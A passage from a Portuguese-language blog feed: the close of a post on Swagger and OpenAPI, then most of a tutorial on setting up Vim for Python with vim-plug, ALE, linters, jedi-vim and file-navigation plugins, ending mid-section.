&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/oai-avengers.jpg" width="640" height="285" title="A OAI é tipo os Avengers do mundo das APIs (bestbuy.com)" alt="A OAI é tipo os Avengers do mundo das APIs (bestbuy.com)"&gt;&lt;/p&gt;
&lt;p&gt;Isso tudo, claro, com supervisão do consórcio que a mesma &lt;em&gt;SmartBear&lt;/em&gt; ajudou a construir:
O &lt;a href="https://www.openapis.org/" title="OAI Consortium"&gt;&lt;em&gt;Open API Initiative&lt;/em&gt;&lt;/a&gt;. Que é também "curador"
do &lt;em&gt;OpenAPI Specification&lt;/em&gt; e tem como integrantes alguns gigantes da indústria como &lt;em&gt;Google&lt;/em&gt;, &lt;em&gt;IBM&lt;/em&gt;, &lt;em&gt;Microsoft&lt;/em&gt;,
e as próprias &lt;em&gt;MuleSoft&lt;/em&gt; e &lt;em&gt;SmartBear&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Swagger &amp;amp; OpenAPI&lt;/h2&gt;
&lt;p&gt;Novamente, deixa eu corrigir o parágrafo do primeiro capítulo:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As vantagens de utilizar &lt;em&gt;Swagger&lt;/em&gt; com &lt;em&gt;OpenAPI Spec&lt;/em&gt; são: Além de confiar
em uma especificação aberta e &lt;em&gt;vendor-neutral&lt;/em&gt;, você ainda conta com o poderoso ferramental
de código aberto provido pelo Swagger.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;O &lt;em&gt;Swagger&lt;/em&gt; "gira em torno" do &lt;em&gt;OpenAPI&lt;/em&gt;, provendo ferramentas para a modelagem e documentação.
É sem dúvida uma combinação espetacular, e não a toa é a mais famosa e eficiente no momento.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Confesso que eu tive problemas para entender o relacionamento entre &lt;em&gt;RAML&lt;/em&gt;, &lt;em&gt;Swagger&lt;/em&gt; e &lt;em&gt;OpenAPI&lt;/em&gt;,
principalmente por ter adotado o &lt;em&gt;RAML&lt;/em&gt; e não seguido o desenvolvimento do &lt;em&gt;Swagger&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Hoje, se você for usar &lt;em&gt;OpenAPI&lt;/em&gt; (você deveria) é improvável que não recorra ao &lt;em&gt;Swagger&lt;/em&gt;
para produzir os seus documentos. Portanto, não é incomum vermos muitos materiais onde esses
dois conceitos se misturam e aparentam ser um só.&lt;/p&gt;
&lt;p&gt;No próximo &lt;em&gt;post&lt;/em&gt; sobre &lt;em&gt;Swagger&lt;/em&gt;, vamos para uma abordagem mais prática, mostrando como utilizar
as ferramentas com &lt;em&gt;OpenAPI&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.caelum.com.br/modelando-apis-rest-com-swagger/"&gt;Caelum - Modelando APIs REST com Swagger&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/endpoints/docs/open-api-spec?hl=pt-br"&gt;Google Cloud Platform - A especificação OpenAPI&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.openapis.org/about"&gt;Open API Initiative - About&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://swagger.io/"&gt;Swagger - The world's most popular API tooling&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/OpenAPI_Specification"&gt;Wikipedia - OpenAPI Specification&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Swagger_(software)"&gt;Wikipedia - Swagger (software)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="rest"></category><category term="microservices"></category><category term="apis"></category><category term="swagger"></category><category term="oai"></category></entry><entry><title>Vim para desenvolvimento em Python</title><link href="https://klauslaube.com.br/2017/10/15/vim-para-desenvolvimento-python.html" rel="alternate"></link><published>2017-10-15T19:20:00-02:00</published><updated>2017-10-15T19:20:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2017-10-15:/2017/10/15/vim-para-desenvolvimento-python.html</id><summary type="html">&lt;p&gt;Já mencionei as motivações de utilizar &lt;a href="https://klauslaube.com.br/tag/vim.html" title="Leia mais sobre Vim"&gt;&lt;em&gt;Vim&lt;/em&gt;&lt;/a&gt;
no &lt;a href="https://klauslaube.com.br/2013/03/04/vim-o-meu-editor-favorito.html" title="Leia o artigo completo"&gt;"Vim: O meu editor favorito"&lt;/a&gt;.
E embora eu já tenha "caído em tentação" e utilizado &lt;a href="https://atom.io/" title="A hackable text editor"&gt;&lt;em&gt;Atom&lt;/em&gt;&lt;/a&gt;
e &lt;a href="http://spacemacs.org/" title="The best editor is neither Emacs nor Vim, it's Emacs and Vim!"&gt;&lt;em&gt;Spacemacs&lt;/em&gt;&lt;/a&gt;
(esse último é simplesmente fantástico), acabo sempre retornando ao &lt;em&gt;Vim&lt;/em&gt;. Principalmente
após o &lt;a href="https://www.reddit.com/r/linux/comments/52e4qo/vim_8_released/" title="Vim 8 released"&gt;lançamento da versão 8&lt;/a&gt;,
onde processamento assíncrono foi adicionado ao editor …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Já mencionei as motivações de utilizar &lt;a href="https://klauslaube.com.br/tag/vim.html" title="Leia mais sobre Vim"&gt;&lt;em&gt;Vim&lt;/em&gt;&lt;/a&gt;
no &lt;a href="https://klauslaube.com.br/2013/03/04/vim-o-meu-editor-favorito.html" title="Leia o artigo completo"&gt;"Vim: O meu editor favorito"&lt;/a&gt;.
E embora eu já tenha "caído em tentação" e utilizado &lt;a href="https://atom.io/" title="A hackable text editor"&gt;&lt;em&gt;Atom&lt;/em&gt;&lt;/a&gt;
e &lt;a href="http://spacemacs.org/" title="The best editor is neither Emacs nor Vim, it's Emacs and Vim!"&gt;&lt;em&gt;Spacemacs&lt;/em&gt;&lt;/a&gt;
(esse último é simplesmente fantástico), acabo sempre retornando ao &lt;em&gt;Vim&lt;/em&gt;. Principalmente
após o &lt;a href="https://www.reddit.com/r/linux/comments/52e4qo/vim_8_released/" title="Vim 8 released"&gt;lançamento da versão 8&lt;/a&gt;,
onde processamento assíncrono foi adicionado ao editor.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Ter o &lt;em&gt;Vim&lt;/em&gt; configurado para trabalhar com projetos &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;
é em teoria algo simples (se você optar por usar extensões). O problema é que durante a seleção de ferramentas, alguns detalhes aparecem
e interferem na construção de um &lt;a href="https://klauslaube.com.br/tag/ambiente-de-desenvolvimento.html" title="Leia mais sobre ambiente de desenvolvimento"&gt;ambiente de desenvolvimento&lt;/a&gt;
capaz de operar sem problemas.&lt;/p&gt;
&lt;p&gt;E como diz o poeta: O diabo está nos detalhes.&lt;/p&gt;
&lt;h2&gt;Packaging: vim-plug&lt;/h2&gt;
&lt;p&gt;Para começar é preciso selecionar um sistema de empacotamento, afim de facilitar a instalação e remoção de &lt;em&gt;plugins&lt;/em&gt;.
Embora o editor possua um &lt;a href="https://shapeshed.com/vim-packages/" title="Vim: So long Pathogen, hello native package loading"&gt;mecanismo &lt;em&gt;built-in&lt;/em&gt;&lt;/a&gt;
em sua versão mais recente, o &lt;a href="https://github.com/junegunn/vim-plug" title="Minimalist Vim Plugin Manager"&gt;&lt;em&gt;vim-plug&lt;/em&gt;&lt;/a&gt; mostra-se
muito (mas muito) mais simples de usar.&lt;/p&gt;
&lt;p&gt;Para instalar o &lt;em&gt;vim-plug&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -fLo ~/.vim/autoload/plug.vim --create-dirs &lt;span class="se"&gt;\&lt;/span&gt;
    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O controle dos &lt;em&gt;plugins&lt;/em&gt; é feito através do &lt;code&gt;.vimrc&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;quot; ~/.vimrc&lt;/span&gt;

&lt;span class="k"&gt;call&lt;/span&gt; plug#begin&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;~/.vim/plugged&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;&amp;quot; Lista de plugins&lt;/span&gt;

&lt;span class="k"&gt;call&lt;/span&gt; plug#&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Uma vez que o &lt;em&gt;plugin&lt;/em&gt; desejado fora adicionado ao &lt;code&gt;.vimrc&lt;/code&gt;, o comando
&lt;code&gt;:PlugInstall&lt;/code&gt; fará o &lt;em&gt;download&lt;/em&gt; e instalação do pacote.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/vim-plug-install.png" width="640" height="650" title="Exemplo de utilização do vim-plug" alt="Exemplo de utilização do vim-plug"&gt;&lt;/p&gt;
&lt;h2&gt;Syntax highlight: vim-polyglot&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Syntax highlighting&lt;/em&gt; é um dos recursos mais básicos (e úteis) que qualquer editor de texto
possa oferecer. É no mínimo curioso o quanto a disposição de cores facilita na leitura
de códigos-fonte.&lt;/p&gt;
&lt;p&gt;O &lt;a href="https://github.com/sheerun/vim-polyglot" title="A solid language pack for Vim"&gt;&lt;em&gt;vim-polyglot&lt;/em&gt;&lt;/a&gt; suporta
dezenas de linguagens (incluindo &lt;em&gt;Python&lt;/em&gt;, claro), e o próprio projeto alega que a sua utilização
não prejudica o &lt;em&gt;startup time&lt;/em&gt; do editor. Logo, uma excelente opção caso o usuário não queira perder
tempo fazendo &lt;em&gt;setup&lt;/em&gt; desse tipo de &lt;em&gt;feature&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;quot; ~/.vimrc&lt;/span&gt;

&lt;span class="k"&gt;call&lt;/span&gt; plug#begin&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;~/.vim/plugged&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;&amp;quot; Lista de plugins&lt;/span&gt;
Plug &lt;span class="s1"&gt;&amp;#39;sheerun/vim-polyglot&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;call&lt;/span&gt; plug#&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para uma rápida instalação, execute &lt;code&gt;:source $MYVIMRC&lt;/code&gt; (para atualizar o &lt;code&gt;.vimrc&lt;/code&gt; em memória) e
em seguida &lt;code&gt;:PlugInstall&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Lint: ALE + flake8 + isort + yapf&lt;/h2&gt;
&lt;p&gt;O &lt;a href="https://github.com/w0rp/ale" title="Asynchronous Lint Engine for Vim"&gt;&lt;em&gt;Asynchronous Lint Engine&lt;/em&gt;&lt;/a&gt; é um desses
projetos que foram feitos para tirar o máximo da nova versão do &lt;em&gt;Vim&lt;/em&gt;. A sua função é na realidade
servir de interface assíncrona para &lt;em&gt;linters&lt;/em&gt; de diferentes linguagens, resultando em validações
do código-fonte sem travar a &lt;em&gt;UI&lt;/em&gt; do editor.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/vim-ale-linters.png" width="640" height="468" title="Lista de linters suportados pelo ALE" alt="Lista de linters suportados pelo ALE"&gt;&lt;/p&gt;
&lt;p&gt;Uma "traquinagem" que ajuda no uso do &lt;em&gt;ALE&lt;/em&gt; é utilizar o parâmetro &lt;code&gt;do&lt;/code&gt;, do &lt;em&gt;vim-plug&lt;/em&gt;, tornando
mais fácil a instalação dos utilitários necessários para que o &lt;em&gt;plugin&lt;/em&gt; funcione:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;quot; ~/.vimrc&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;...&lt;span class="p"&gt;)&lt;/span&gt;

Plug &lt;span class="s1"&gt;&amp;#39;w0rp/ale&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; { &lt;span class="s1"&gt;&amp;#39;do&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;pip install flake8 isort yapf&amp;#39;&lt;/span&gt; }

&lt;span class="k"&gt;call&lt;/span&gt; plug#&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Importante notar que se o &lt;em&gt;Vim&lt;/em&gt; for aberto dentro de um &lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre Virtualenv"&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;,
os pacotes &lt;em&gt;Python&lt;/em&gt; serão instalados no ambiente virtual ativo. Para contornar esse problema,
e tornar essas ferramentas "globais", é possível utilizar o &lt;a href="https://medium.com/@henriquebastos/the-definitive-guide-to-setup-my-python-workspace-628d68552e14" title="The definitive guide to setup my Python workspace"&gt;&lt;em&gt;pyenv&lt;/em&gt;&lt;/a&gt;.
Executar &lt;code&gt;:PlugInstall!&lt;/code&gt; para cada &lt;em&gt;virtualenv&lt;/em&gt; pode ser uma opção também.&lt;/p&gt;
&lt;p&gt;Caso algo não esteja funcionando, o &lt;code&gt;:ALEInfo&lt;/code&gt; dará dicas de onde o problema está escondido.&lt;/p&gt;
&lt;h3&gt;Linter: flake8&lt;/h3&gt;
&lt;p&gt;O &lt;a href="http://flake8.pycqa.org/en/latest/" title="Flake8: Your Tool For Style Guide Enforcement"&gt;&lt;em&gt;flake8&lt;/em&gt;&lt;/a&gt; assegura
que o código escrito esteja dentro das convenções da &lt;a href="https://klauslaube.com.br/2011/08/26/assegure-qualidade-seu-codigo-python-pep.html" title="Leia mais sobre PEP8"&gt;&lt;em&gt;PEP8&lt;/em&gt;&lt;/a&gt;.
Alguns alertas aparecerão na tela do editor quando alguma violação acontecer:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/vim-ale-flake8.png" width="640" height="402" title="Flake8 + ALE" alt="Flake8 + ALE"&gt;&lt;/p&gt;
&lt;h3&gt;Fixers: isort e yapf&lt;/h3&gt;
&lt;p&gt;O &lt;em&gt;ALE&lt;/em&gt; possui o conceito de "fixers". Eles são executados para realizar reparos no código-fonte
aberto, sem a necessidade da chamada de nenhum comando adicional. Em um arquivo &lt;em&gt;Python&lt;/em&gt;, o &lt;code&gt;:ALEFixSuggest&lt;/code&gt;
trará sugestões de &lt;em&gt;fixers&lt;/em&gt; para a linguagem:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Try the following fixers appropriate &lt;span class="k"&gt;for&lt;/span&gt; the &lt;span class="k"&gt;filetype&lt;/span&gt;:

&lt;span class="s1"&gt;&amp;#39;add_blank_lines_for_python_control_statements&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; Add blank &lt;span class="nb"&gt;lines&lt;/span&gt; before control statements.
&lt;span class="s1"&gt;&amp;#39;autopep8&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; Fix PEP8 issues with autopep8.
&lt;span class="s1"&gt;&amp;#39;isort&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; Sort Python imports with isort.
&lt;span class="s1"&gt;&amp;#39;yapf&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; Fix Python &lt;span class="k"&gt;files&lt;/span&gt; with yapf.

Try the following generic fixers:

&lt;span class="s1"&gt;&amp;#39;remove_trailing_lines&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; Remove &lt;span class="k"&gt;all&lt;/span&gt; blank &lt;span class="nb"&gt;lines&lt;/span&gt; at the &lt;span class="k"&gt;end&lt;/span&gt; of &lt;span class="k"&gt;a&lt;/span&gt; &lt;span class="k"&gt;file&lt;/span&gt;.
&lt;span class="s1"&gt;&amp;#39;trim_whitespace&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; Remove &lt;span class="k"&gt;all&lt;/span&gt; trailing whitespace characters at the &lt;span class="k"&gt;end&lt;/span&gt; of every line.

See :help ale&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="k"&gt;fix&lt;/span&gt;&lt;span class="p"&gt;-&lt;/span&gt;configuration

Press &lt;span class="k"&gt;q&lt;/span&gt; &lt;span class="k"&gt;to&lt;/span&gt; &lt;span class="k"&gt;close&lt;/span&gt; this &lt;span class="nb"&gt;window&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;a href="https://pypi.python.org/pypi/isort" title="A Python utility / library to sort Python imports"&gt;&lt;em&gt;isort&lt;/em&gt;&lt;/a&gt;
é uma ferramenta muito útil que ajuda na ordenação dos &lt;code&gt;import&lt;/code&gt; &lt;em&gt;Python&lt;/em&gt;. Já o
&lt;a href="https://github.com/google/yapf A formatter for Python files&amp;quot;"&gt;&lt;em&gt;yapf&lt;/em&gt;&lt;/a&gt; formatará
os arquivos respeitando a &lt;em&gt;PEP8&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para habilitar esses recursos, basta adicionar a seguinte configuração ao &lt;code&gt;~/.vimrc&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;quot; ~/.vimrc&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;...&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;call&lt;/span&gt; plug#&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:ale_fix_on_save &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:ale_fixers &lt;span class="p"&gt;=&lt;/span&gt; {
\   &lt;span class="s1"&gt;&amp;#39;python&amp;#39;&lt;/span&gt;: [
\       &lt;span class="s1"&gt;&amp;#39;isort&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
\       &lt;span class="s1"&gt;&amp;#39;yapf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
\       &lt;span class="s1"&gt;&amp;#39;remove_trailing_lines&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
\       &lt;span class="s1"&gt;&amp;#39;trim_whitespace&amp;#39;&lt;/span&gt;
\   ]
\}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com o &lt;code&gt;g:ale_fix_on_save = 1&lt;/code&gt;, ao salvar o arquivo os &lt;em&gt;fixers&lt;/em&gt; serão executados automaticamente.
É possível executá-los também através do comando &lt;code&gt;:ALEFix&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Code Completion: completor.vim&lt;/h2&gt;
&lt;p&gt;Embora o &lt;a href="https://github.com/Valloric/YouCompleteMe" title="A code-completion engine for Vim"&gt;&lt;em&gt;YouCompleteMe&lt;/em&gt;&lt;/a&gt;
seja a opção &lt;em&gt;standard&lt;/em&gt; para &lt;em&gt;autocomplete&lt;/em&gt; no &lt;em&gt;Vim&lt;/em&gt;, foi no &lt;a href="https://github.com/maralla/completor.vim" title="Async completion framework made ease"&gt;&lt;em&gt;completor&lt;/em&gt;&lt;/a&gt;
que eu encontrei um bom balanço entre complexidade e benefícios.&lt;/p&gt;
&lt;p&gt;Utilizando o &lt;em&gt;engine&lt;/em&gt; de &lt;em&gt;async&lt;/em&gt; do &lt;em&gt;Vim 8&lt;/em&gt;, o &lt;em&gt;plugin&lt;/em&gt; é capaz de entregar &lt;em&gt;code completion&lt;/em&gt;
de uma maneira muito rápida, e ainda possui uma boa abstração a &lt;em&gt;semantic completion&lt;/em&gt; (que fará
o &lt;em&gt;autocomplete&lt;/em&gt; funcionar "de fato" no caso do &lt;em&gt;Python&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/vim-completor-example.png" width="640" height="253" title="Exemplo de uso do Completor" alt="Exemplo de uso do Completor"&gt;&lt;/p&gt;
&lt;p&gt;O &lt;a href="https://github.com/davidhalter/jedi" title="Awesome autocompletion and static analysis library for python"&gt;&lt;em&gt;jedi&lt;/em&gt;&lt;/a&gt;
é o utilitário "hors concours" para essa tarefa:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;quot; ~/.vimrc&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;...&lt;span class="p"&gt;)&lt;/span&gt;

Plug &lt;span class="s1"&gt;&amp;#39;maralla/completor.vim&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; { &lt;span class="s1"&gt;&amp;#39;do&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;pip install jedi&amp;#39;&lt;/span&gt; }

&lt;span class="k"&gt;call&lt;/span&gt; plug#&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A dica de usar &lt;em&gt;pyenv&lt;/em&gt; ou de instalar para cada &lt;em&gt;virtualenv&lt;/em&gt; (do tópico de &lt;em&gt;Lint&lt;/em&gt;), vale aqui também.&lt;/p&gt;
&lt;h2&gt;Navegar pelo código-fonte: jedi-vim&lt;/h2&gt;
&lt;p&gt;E falando de &lt;em&gt;jedi&lt;/em&gt;, o &lt;a href="https://github.com/davidhalter/jedi-vim" title="Using the jedi autocompletion library for VIM"&gt;&lt;em&gt;jedi-vim&lt;/em&gt;&lt;/a&gt;
é outra figurinha carimbada nos &lt;code&gt;.vimrc&lt;/code&gt; de muitos desenvolvedores &lt;em&gt;Python&lt;/em&gt;. Assim como o
&lt;em&gt;completor&lt;/em&gt;, ele fornece &lt;em&gt;autocompletion&lt;/em&gt; e uma excelente ferramenta de &lt;em&gt;static analysis&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/vim-jedi.jpg" width="640" height="360" title="Nunca renda-se ao lado emacs da força (jovemnerd.com.br)" alt="Nunca renda-se ao lado emacs da força (jovemnerd.com.br)"&gt;&lt;/p&gt;
&lt;p&gt;Se você programa somente em &lt;em&gt;Python&lt;/em&gt;, esqueça o &lt;em&gt;completor&lt;/em&gt; e use apenas o &lt;em&gt;jedi-vim&lt;/em&gt;. Caso contrário,
se você programa em mais linguagens, o &lt;em&gt;completor&lt;/em&gt; ainda é uma opção atraente (por ser "genérico").&lt;/p&gt;
&lt;p&gt;Além do &lt;em&gt;completion&lt;/em&gt; o &lt;em&gt;jedi-vim&lt;/em&gt; tem outras funcionalidades que são muito úteis para lidar com grandes projetos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Goto assignments&lt;/em&gt; (&lt;code&gt;&amp;lt;leader&amp;gt;g&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Goto definitions&lt;/em&gt; (&lt;code&gt;&amp;lt;leader&amp;gt;d&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Mostrar documentação (&lt;code&gt;K&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Renomear (&lt;code&gt;&amp;lt;leader&amp;gt;r&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Exibir uso (&lt;code&gt;&amp;lt;leader&amp;gt;n&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Portanto, é sempre útil tê-lo no seu ambiente de desenvolvimento:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;quot; ~/.vimrc&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;...&lt;span class="p"&gt;)&lt;/span&gt;

Plug &lt;span class="s1"&gt;&amp;#39;davidhalter/jedi-vim&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; { &lt;span class="s1"&gt;&amp;#39;do&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;pip install jedi&amp;#39;&lt;/span&gt; }

&lt;span class="k"&gt;call&lt;/span&gt; plug#&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;...&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:jedi#completions_enabled &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A última linha acima é essencial para que o &lt;em&gt;completion&lt;/em&gt; do &lt;em&gt;jedi-vim&lt;/em&gt; não conflite com o do &lt;em&gt;completor&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Navegar pelo sistema de arquivos: NERDTree e ctrlp.vim&lt;/h2&gt;
&lt;p&gt;Aqui eu vou "chover no molhado" e indicar &lt;a href="https://github.com/scrooloose/nerdtree" title="A tree explorer plugin for vim"&gt;&lt;em&gt;NERDTree&lt;/em&gt;&lt;/a&gt;
e &lt;a href="https://github.com/ctrlpvim/ctrlp.vim" title="Fuzzy file, buffer, mru, tag, etc finder"&gt;&lt;em&gt;ctrlp.vim&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;O primeiro exibe um simpático &lt;em&gt;file explorer&lt;/em&gt; no lado esquerdo do editor, muito útil quando você não faz
ideia do que está procurando, e tem que ter uma visão dos arquivos e diretórios do projeto:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/vim-nerdtree.png" width="640" height="503" title="Exemplo de uso do NERDTree" alt="Exemplo de uso do NERDTree"&gt;&lt;/p&gt;
&lt;p&gt;Com o uso do &lt;a href="https://github.com/Xuyuanp/nerdtree-git-plugin" title="A plugin of NERDTree showing git status"&gt;&lt;em&gt;nerdtree-git-plugin&lt;/em&gt;&lt;/a&gt;
ele fica ainda mais interessante, pois sinaliza os arquivos que sofreram modificações dentro de um
repositório &lt;a href="https://klauslaube.com.br/tag/git.html" title="Leia mais sobre Git"&gt;&lt;em&gt;Git&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Já o &lt;em&gt;ctrlp.vim&lt;/em&gt; é usado para buscas de arquivos e &lt;em&gt;buffers&lt;/em&gt;. Muito útil para quando você já tem ideia
do que vai procurar:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/vim-ctrlp.png" width="640" height="447" title="Exemplo de uso do ctrlp.vim" alt="Exemplo de uso do ctrlp.vim"&gt;&lt;/p&gt;
&lt;p&gt;A instalação através do &lt;em&gt;vim-plug&lt;/em&gt; é simples, como sempre:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;quot; ~/.vimrc&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;...&lt;span class="p"&gt;)&lt;/span&gt;

Plug &lt;span class="s1"&gt;&amp;#39;ctrlpvim/ctrlp.vim&amp;#39;&lt;/span&gt;
Plug &lt;span class="s1"&gt;&amp;#39;scrooloose/nerdtree&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; Plug &lt;span class="s1"&gt;&amp;#39;Xuyuanp/nerdtree-git-plugin&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;call&lt;/span&gt; plug#&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;...&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;Bônus:&lt;/strong&gt; O &lt;a href="https://github.com/mileszs/ack.vim" title="Vim plugin for the Perl module / CLI script 'ack'"&gt;&lt;em&gt;ack.vim&lt;/em&gt;&lt;/a&gt;
é um excelente &lt;em&gt;plugin&lt;/em&gt; para buscas por conteúdo.&lt;/p&gt;
&lt;h2&gt;Executar testes: vim-test&lt;/h2&gt;
&lt;p&gt;O &lt;a href="https://github.com/janko-m/vim-test" title="Run your tests at the speed of thought"&gt;&lt;em&gt;vim-test&lt;/em&gt;&lt;/a&gt; é um
